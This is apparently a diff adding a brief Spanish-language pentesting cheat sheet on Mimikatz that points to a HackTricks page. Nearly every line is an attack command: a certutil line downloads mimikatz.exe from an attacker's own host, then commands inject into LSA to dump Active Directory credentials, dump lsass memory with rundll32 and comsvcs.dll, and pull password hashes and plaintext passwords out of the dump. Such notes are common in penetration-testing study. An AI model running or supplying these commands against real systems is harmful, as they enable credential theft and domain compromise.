@@ -1,0 +1,19 @@
+	### Mimikatz
+https://book.hacktricks.xyz/v/es/windows-hardening/stealing-credentials/credentials-mimikatz
+
+## Descarga
+certutil -urlcache -f http://<mi ip>:8000/mimikatz.exe mimikatz.exe
+#Descargar con certutil mimikatz y guardarlo con el nombre que queremos
+
+## Ejecucion
+lsadump::lsa /inject
+#Dumpea las credenciales de AD del DC o lsass.smp
+
+Get-Process lsass
+#Obtener proceso de lsass
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 656 C:\lsass.dmp full
+#Dumpear el proceso y guardarlo en lsass.dmp
+privilege::debug
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+#Esta serie de comandos permite dumpear los hashes/pwd de lsass.dmp
